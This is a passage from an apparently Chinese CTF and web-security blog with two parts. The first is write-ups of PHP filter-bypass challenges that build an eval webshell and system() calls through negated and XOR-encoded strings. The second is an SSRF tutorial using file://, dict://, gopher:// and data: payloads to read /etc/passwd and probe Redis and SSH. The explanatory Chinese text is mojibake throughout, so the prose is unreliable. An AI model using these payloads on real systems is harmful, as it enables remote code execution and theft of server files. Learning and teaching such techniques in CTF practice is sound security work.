<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?_=(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure>

<img src="http://goodcheerleung.gitee.io/blog/å¾®ä¿¡æˆªå›¾_20200717104946.png" style="high:80%;width:80%;" />

<p>æ„é€ shell</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(~$a);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">$c=<span class="string">&#x27;(eval($_POST[cmd]))&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(~$c);</span><br><span class="line"><span class="comment">//%9E%8C%8C%9A%8D%8B</span></span><br><span class="line"><span class="comment">//%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9C%92%9B%A2%D6%D6</span></span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9C%92%9B%A2%D6%D6);</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯è¿™é‡Œçš„è¯æ„é€ shellç¬¬äºŒä¸ªè¿‡æ»¤è¿‡ä¸å»ï¼Œè€Œä¸”ç½‘ä¸Šæ²¡çœ‹åˆ°æœ‰writeupæœ‰æ„é€ shellçš„ï¼Œçœ‹åˆ°éƒ½æ˜¯å–åå¼‚æˆ–æ„é€ å‡½æ•°å»æ‰¾flagï¼Œè¿™é‡Œåˆæ°å¥½æ˜¯PHP7çš„ç‰ˆæœ¬ï¼Œå¯ä»¥ä½¿ç”¨è¿™ç§æ–¹å¼ï¼Œè¿™é‡Œè´´ä¸€ä¸‹è§£é¢˜è¿‡ç¨‹</p>
<ul>
<li>å–åå¼‚æˆ–</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">((%<span class="number">8</span>f%<span class="number">8</span>d%<span class="number">96</span>%<span class="number">91</span>%<span class="number">8</span>b%a0%<span class="number">8</span>d)^(%ff%ff%ff%ff%ff%ff%ff))(((%<span class="number">8</span>c%<span class="number">9</span>c%<span class="number">9</span>e%<span class="number">91</span>%<span class="number">9</span>b%<span class="number">96</span>%<span class="number">8</span>d)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));</span><br><span class="line">//print_r(scandir(<span class="string">&#x27;.&#x27;</span>));</span><br></pre></td></tr></table></figure>

<p>count_charsè¿‡ä¸å»ï¼Œéœ€è¦ç¼©å‡å­—ç¬¦</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((%<span class="number">9</span>b%<span class="number">9</span>c%<span class="number">9</span>b%<span class="number">9</span>b%<span class="number">9</span>b%<span class="number">9</span>b%<span class="number">9</span>c)^(%<span class="number">9</span>b%<span class="number">8</span>f%<span class="number">9</span>b%<span class="number">9</span>c%<span class="number">9</span>c%<span class="number">9</span>b%<span class="number">8</span>f)^(%<span class="number">8</span>f%<span class="number">9</span>e%<span class="number">96</span>%<span class="number">96</span>%<span class="number">8</span>c%a0%<span class="number">9</span>e)^(%ff%ff%ff%ff%ff%ff%ff))(((%<span class="number">9</span>b%<span class="number">9</span>b%<span class="number">9</span>b%<span class="number">9</span>b%<span class="number">9</span>b%<span class="number">9</span>b%<span class="number">9</span>c)^(%<span class="number">9</span>b%<span class="number">9</span>b%<span class="number">9</span>b%<span class="number">9</span>c%a0%<span class="number">9</span>b%<span class="number">8</span>f)^(%<span class="number">8</span>c%<span class="number">9</span>c%<span class="number">9</span>e%<span class="number">96</span>%a0%<span class="number">96</span>%<span class="number">9</span>e)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));</span><br></pre></td></tr></table></figure>

<p>å›æ˜¾</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; index.php [3] =&gt; n0t_a_flAg_FiLe_dONT_rE4D_7hIs.txt ) </span><br></pre></td></tr></table></figure>

<p>è¯»æ–‡ä»¶</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">((%<span class="number">8</span>d%<span class="number">9</span>c%<span class="number">97</span>%a0%<span class="number">88</span>%<span class="number">8</span>d%<span class="number">97</span>%<span class="number">8</span>d%<span class="number">9</span>c%a0%a0)^(%<span class="number">9</span>a%<span class="number">97</span>%<span class="number">9</span>b%<span class="number">88</span>%a0%<span class="number">9</span>a%<span class="number">9</span>b%<span class="number">9</span>b%<span class="number">8</span>d%<span class="number">9</span>c%<span class="number">9</span>a)^(%<span class="number">9</span>b%<span class="number">9</span>c%<span class="number">9</span>c%a0%<span class="number">88</span>%<span class="number">9</span>b%<span class="number">9</span>c%<span class="number">9</span>c%<span class="number">9</span>c%a0%a0)^(%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff))(((%a0%<span class="number">97</span>%<span class="number">8</span>d)^(%<span class="number">9</span>a%<span class="number">9</span>a%<span class="number">9</span>b)^(%a0%<span class="number">9</span>c%<span class="number">8</span>d)^(%ff%ff%ff))(((%<span class="number">8</span>d%a0%<span class="number">88</span>%<span class="number">97</span>%<span class="number">8</span>d%<span class="number">9</span>b%<span class="number">9</span>c)^(%<span class="number">9</span>a%<span class="number">9</span>c%<span class="number">8</span>d%<span class="number">9</span>a%<span class="number">9</span>b%<span class="number">9</span>a%<span class="number">8</span>d)^(%<span class="number">9</span>b%a0%<span class="number">9</span>b%<span class="number">9</span>c%<span class="number">8</span>d%<span class="number">97</span>%<span class="number">9</span>c)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)));</span><br><span class="line">//show_source(end(scandir(.)));</span><br></pre></td></tr></table></figure>

<h2 id="ä¾‹å­ä¸‰"><a href="#ä¾‹å­ä¸‰" class="headerlink" title="ä¾‹å­ä¸‰"></a><strong>ä¾‹å­ä¸‰</strong></h2><p>ç¬¬äº”ç©ºé—´hate-php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $code = $_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/(f|l|a|g|\.|p|h|\/|;|\&quot;|\&#x27;|\`|\||\[|\]|\_|=)/i&#x27;</span>,$code)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;You are too good for me&#x27;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = get_defined_functions()[<span class="string">&#x27;internal&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123; </span><br><span class="line">        <span class="keyword">if</span> (preg_match (<span class="string">&#x27;/&#x27;</span> . $blackitem . <span class="string">&#x27;/im&#x27;</span>, $code)) &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;You deserve better&#x27;</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    assert($code);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸€ä¸ªæ­£åˆ™è¿‡æ»¤äº†ä¸€äº›ç¬¦å·äº†flag.phä¸­ä»»æ„çš„å­—ç¬¦ï¼Œç¬¬äºŒä¸ª<code>foreach</code>è¿‡æ»¤äº†æ‰€æœ‰å†…ç½®å‡½æ•°</p>
<ul>
<li>exp1</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?code=(~%8C%86%8C%8B%9A%92)($&#123;%a7%ae%ac%ac^%f8%e9%e9%f8&#125;&#123;%a7&#125;)&amp;%a7=cat%20flag.php</span><br><span class="line">//system(&#123;_GET&#125;&#123;%a7&#125;)&amp;%a7=cat%<span class="number">20</span>flag.php</span><br></pre></td></tr></table></figure>

<ul>
<li>exp2</li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?code=$&#123;~%a0%b8%ba%ab&#125;&#123;%a0&#125;($&#123;~%a0%b8%ba%ab&#125;&#123;%a1&#125;)&amp;%a0=highlight_file&amp;%a1=flag.php</span><br><span class="line">//?code=$&#123;_GET&#125;&#123;%a0&#125;($&#123;_GET&#125;&#123;%a1&#125;)&amp;%a0=highlight_file&amp;%a1=flag.php</span><br></pre></td></tr></table></figure>

<ul>
<li>exp3</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?code=(~(%8c%86%8c%8b%9a%92))((~(%9a%91%9b))((~(%98%9a%8b%9e%93%93%97%9a%9e%9b%9a%8d%8c))()))</span><br><span class="line">//?code=(system)((end)((getallheaders)()))</span><br><span class="line">//?code=system(end(getallheaders()))</span><br><span class="line">//éœ€è¦è¯·æ±‚å¤´æ·»åŠ </span><br><span class="line">kawhi: cat flag.php</span><br></pre></td></tr></table></figure>

<p>é¢˜ç›®</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;evil&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(strlen($_GET[<span class="string">&#x27;evil&#x27;</span>])&gt;<span class="number">25</span>||preg_match(<span class="string">&quot;/[\w$=()&lt;&gt;&#x27;\&quot;]/&quot;</span>, $_GET[<span class="string">&#x27;evil&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;danger!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($_GET[<span class="string">&#x27;evil&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;?evil&#x3D;&#96;.+&#x2F;???&#x2F;????????[@-[]&#96;; HTTP&#x2F;1.1</span><br><span class="line">Host: 47.98.234.232:28000</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Linux; Android 10; VOG-AL10 Build&#x2F;HUAWEIVOG-AL10; wv) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Version&#x2F;4.0 Chrome&#x2F;77.0.3865.120 MQQBrowser&#x2F;6.2 TBS&#x2F;045331 Mobile Safari&#x2F;537.36 MMWEBID&#x2F;9471 MicroMessenger&#x2F;7.0.19.1760(0x27001339) Process&#x2F;tools WeChat&#x2F;arm64 NetType&#x2F;WIFI</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------367263770318294676713873117171</span><br><span class="line">Content-Length: 241</span><br><span class="line">Origin: http:&#x2F;&#x2F;106.55.148.151:31002</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;106.55.148.151:31002&#x2F;index.php?file&#x3D;abc.txt</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line"></span><br><span class="line">-----------------------------367263770318294676713873117171</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file1&quot;; filename&#x3D;&quot;abc.txt&quot;</span><br><span class="line">Content-Type: text&#x2F;plain</span><br><span class="line"></span><br><span class="line">ls &#x2F; &gt; &#x2F;var&#x2F;www&#x2F;html&#x2F;hello</span><br><span class="line">-----------------------------367263770318294676713873117171--</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.getflag.cn/2020/07/14/SSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="http://yuhaojiang.gitee.io/picture/Blogå¤´åƒ.jpg">
      <meta itemprop="name" content="kawhi">
      <meta itemprop="description" content="æ²¡æœ‰æ³¢æ¶›ï¼Œå¦‚ä½•æ±¹æ¶Œ">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="kawhi">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/07/14/SSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">SSRFæ¼æ´å­¦ä¹ </a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2020-07-14 00:00:00" itemprop="dateCreated datePublished" datetime="2020-07-14T00:00:00+08:00">2020-07-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2020-10-16 11:54:45" itemprop="dateModified" datetime="2020-10-16T11:54:45+08:00">2020-10-16</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">webå®‰å…¨</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a><strong>å‰è¨€</strong></h1><p>æ€»ç»“çš„ä¸æ˜¯å¾ˆå…¨ï¼Œä»¥åæ…¢æ…¢æ›´ã€‚</p>
<h1 id="ssrfæ˜¯ä»€ä¹ˆ"><a href="#ssrfæ˜¯ä»€ä¹ˆ" class="headerlink" title="ssrfæ˜¯ä»€ä¹ˆ"></a><strong>ssrfæ˜¯ä»€ä¹ˆ</strong></h1><p><strong>SSRF(Server-Side Request Forgery:æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ )</strong></p>
<p>å…¶å½¢æˆçš„åŸå› å¤§éƒ½æ˜¯ç”±äºæœåŠ¡ç«¯<strong>æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½</strong>ï¼Œä½†åˆæ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšä¸¥æ ¼è¿‡æ»¤ä¸é™åˆ¶ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥ä¼ å…¥ä»»æ„çš„åœ°å€æ¥è®©åç«¯æœåŠ¡å™¨å¯¹å…¶å‘èµ·è¯·æ±‚ï¼Œå¹¶è¿”å›å¯¹è¯¥ç›®æ ‡åœ°å€è¯·æ±‚çš„æ•°æ®ã€‚</p>
<p>æ¯”å¦‚æœ‰ä¸ªURLæ˜¯è¿™æ ·çš„ï¼š</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxx.com/image.php?image=http://www.kawhi.xyz/a.jpg</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªURLåŸæœ¬æ˜¯æœåŠ¡ç«¯å‘èµ·è¯·æ±‚è·å–é“¾æ¥åœ°å€çš„å›¾ç‰‡æ•°æ®ã€‚</p>
<p>ä½†æ˜¯å¦‚æœå­˜åœ¨SSRFæ¼æ´çš„è¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ä¸€äº›åè®®æ¥è¯»å–å’Œæ‰§è¡Œç›¸å…³å‘½ä»¤ï¼Œä¾‹å¦‚ï¼š</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxx.com/image.php?image=http://127.0.0.1:22</span><br><span class="line">http://www.xxx.com/image.php?image=file:///etc/passwd</span><br><span class="line">http://www.xxx.com/image.php?image=dict://127.0.0.1:22/</span><br><span class="line">http://www.xxx.com/image.php?image=gopher://127.0.0.1:2233/_test</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œå¦‚ä½•åˆ¤æ–­æ˜¯å¦å­˜åœ¨SSRFæ¼æ´å‘¢ï¼Ÿ</p>
<p>é€šå¸¸æ¥è¯´ä¼šå‡ºç°SSRFçš„åœ°æ–¹æ¯”å¦‚ä¸Šé¢è¯´çš„URLåœ°å€åŠ è½½æˆ–ä¸‹è½½å›¾ç‰‡</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxx.com/image.php?image=http://www.kawhi.xyz/a.jpg</span><br></pre></td></tr></table></figure>

<p>è¿˜æœ‰å°±æ˜¯å›¾ç‰‡ã€æ–‡ç« æ”¶è—åŠŸèƒ½</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://title.xxx.com/title?title=http://title.xxx.com/fhaljs</span><br></pre></td></tr></table></figure>

<p>ä»¥åŠé€šè¿‡URLåˆ†äº«ï¼Œè½¬ç æœåŠ¡ï¼Œåœ¨çº¿ç¿»è¯‘ï¼Œæœªå…¬å¼€çš„apiå®ç°ä»¥åŠå…¶ä»–æ‰©å±•è°ƒç”¨URLçš„åŠŸèƒ½ç­‰ç­‰ä¸€äº›åœ°æ–¹ã€‚æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡ä¸€äº›urlä¸­çš„å…³é”®å­—æ¥è¯†åˆ«ï¼Œæ¯”å¦‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shareã€wapã€urlã€linkã€srcã€sourceã€targetã€uã€<span class="number">3</span>gã€displayã€sourceURlã€imageURLã€domain...</span><br></pre></td></tr></table></figure>

<h1 id="ssrfå°è¯•éªŒ"><a href="#ssrfå°è¯•éªŒ" class="headerlink" title="ssrfå°è¯•éªŒ"></a>ssrfå°è¯•éªŒ</h1><p>é¦–å…ˆè¦çŸ¥é“å¯èƒ½å‡ºç°SSRFçš„å‡½æ•°æœ‰ï¼š<code>file_get_contents()</code>ã€<code>curl()</code>ã€<code>fsocksopen()</code>ã€<code>fopen()</code>ç­‰ï¼Œè¿™é‡Œç”¨<code>curl()</code>æ¥ä¸¾ä¾‹å­ã€‚</p>
<p>å­˜åœ¨SSRFæ¼æ´çš„ä»£ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params">$url</span>)</span>&#123;</span><br><span class="line">  <span class="comment">//åˆ›å»ºä¸€ä¸ªæ–°çš„curlèµ„æº</span></span><br><span class="line">  $ch = curl_init();</span><br><span class="line">  <span class="comment">//è®¾ç½®URLå’Œç›¸åº”çš„é€‰é¡¹</span></span><br><span class="line">  curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class="line">  curl_setopt($ch,CURLOPT_HEADER,<span class="literal">false</span>);</span><br><span class="line">  <span class="comment">//æŠ“å–URLå¹¶æŠŠå®ƒä¼ é€’ç»™æµè§ˆå™¨</span></span><br><span class="line">  curl_exec($ch);</span><br><span class="line">  <span class="comment">//å…³é—­curlèµ„æºï¼Œå¹¶ä¸”é‡Šæ”¾ç³»ç»Ÿèµ„æº</span></span><br><span class="line">  curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line">$url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">curl($url);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>httpåè®®</li>
</ul>
<p>æ¢æµ‹å†…ç½‘ä¸»æœºå­˜æ´»</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.xxx.xxx.xxx:5212/ssrf.php?url=http://127.0.0.1:1314</span><br></pre></td></tr></table></figure>

<ul>
<li>é€šè¿‡fileåè®®è¯»å–æ–‡ä»¶</li>
</ul>
<p>åœ¨æœ‰å›æ˜¾çš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨ file åè®®å¯ä»¥è¯»å–ä»»æ„å†…å®¹</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#win</span></span><br><span class="line">http://127.0.0.1/ssrf.php?url=file:///C:/WINDOWS/win.ini</span><br><span class="line"><span class="comment">#liunx</span></span><br><span class="line">http://39.xxx.xxx.xxx:5212/ssrf.php?url=file:///etc/passwd</span><br></pre></td></tr></table></figure>

<ul>
<li>dictåè®®</li>
</ul>
<p>æ³„éœ²å®‰è£…è½¯ä»¶ç‰ˆæœ¬ä¿¡æ¯ï¼ŒæŸ¥çœ‹ç«¯å£ï¼Œæ“ä½œå†…ç½‘redisæœåŠ¡ç­‰</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.xxx.xxx.xxx:5212/ssrf.php?url=dict://127.0.0.1:6379/info</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹redisçš„ç›¸å…³é…ç½®ã€‚</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.xxx.xxx.xxx:5212/ssrf.php?url=dict://127.0.0.1:22/info</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹sshçš„bannerä¿¡æ¯</p>
<ul>
<li>gopheråè®®</li>
</ul>
<p>gopheræ”¯æŒå‘å‡ºGETã€POSTè¯·æ±‚ï¼šå¯ä»¥å…ˆæˆªè·getè¯·æ±‚åŒ…å’Œpostè¯·æ±‚åŒ…ï¼Œå†æ„é€ æˆç¬¦åˆgopheråè®®çš„è¯·æ±‚ï¼Œgopheråè®®æ˜¯ssrfåˆ©ç”¨ä¸­ä¸€ä¸ªæœ€å¼ºå¤§çš„åè®®(ä¿—ç§°ä¸‡èƒ½åè®®)ï¼Œå¯ç”¨äºåå¼¹shellã€‚</p>
<p>è¿™é‡Œä½¿ç”¨çš„æ˜¯é˜¿é‡Œäº‘æœåŠ¡å™¨ï¼Œå…ˆå¼€å¯ä¸€ä¸ªç›‘å¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@iZ2ze3hhi0u5dwj1frqvh7Z:~<span class="comment"># nc -lvvp 8102</span></span><br><span class="line">listening on [any] <span class="number">8102</span> ...</span><br></pre></td></tr></table></figure>

<p>ç„¶åè®¿é—®</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.xxx.xxx.xxx:5212/ssrf.php?url=gopher://127.0.0.1:8102/_test</span><br></pre></td></tr></table></figure>

<p>å›æ˜¾</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@iZ2ze3hhi0u5dwj1frqvh7Z:~<span class="comment"># nc -lvvp 8102</span></span><br><span class="line">listening on [any] <span class="number">8102</span> ...</span><br><span class="line">connect to [<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>] <span class="keyword">from</span> localhost [<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>] <span class="number">52450</span></span><br><span class="line">test</span><br></pre></td></tr></table></figure>

<h1 id="ssrfæ€ä¹ˆç»•"><a href="#ssrfæ€ä¹ˆç»•" class="headerlink" title="ssrfæ€ä¹ˆç»•"></a><strong>ssrfæ€ä¹ˆç»•</strong></h1><p>è¿™é‡Œæ€»ç»“äº†ä¸€äº›æ¯”è¾ƒå¸¸ç”¨çš„ç»•è¿‡æ–¹æ³•ã€‚</p>
<ul>
<li>dataä¼ªåè®®ç»•è¿‡</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Â <span class="meta">&lt;?php</span> Â  Â </span><br><span class="line">Â highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/php|file|\/\/|sftp|ldap|gopher|http|https/is&#x27;</span>, $_GET[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">     <span class="keyword">die</span>(<span class="string">&quot;no hack&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">$a = file_get_contents($_GET[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="keyword">eval</span>($a); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:text/plain;base64,cGhwaW5mbygpOw==</span><br></pre></td></tr></table></figure>

<ul>
<li>IPé™åˆ¶ç»•è¿‡</li>
</ul>
